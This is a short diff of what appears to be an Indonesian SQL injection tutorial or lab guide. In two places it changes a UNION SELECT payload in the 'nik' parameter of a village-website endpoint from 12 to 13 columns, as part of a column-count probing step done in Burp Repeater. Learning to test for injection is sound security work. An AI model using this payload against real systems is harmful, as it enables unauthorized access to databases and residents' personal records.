@@ -62,7 +62,7 @@ nik=3273010101000001
 ### Testing di Repeater
 1. Ubah parameter `nik` menjadi:
    ```
-   nik=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -
+   nik=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -
    ```
 2. Klik **Send**
 3. Analisis response di panel kanan
@@ -256,7 +256,7 @@ Response: [error - too many columns]
 ```
 Request:
 POST /webdesa/cek_warga.php
-nik=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12-- -
+nik=' UNION SELECT 1,2,3,4,5,6,7,8,9,10,11,12,13-- -
 
 Response: [perhatikan angka mana yang muncul di halaman]
 ```
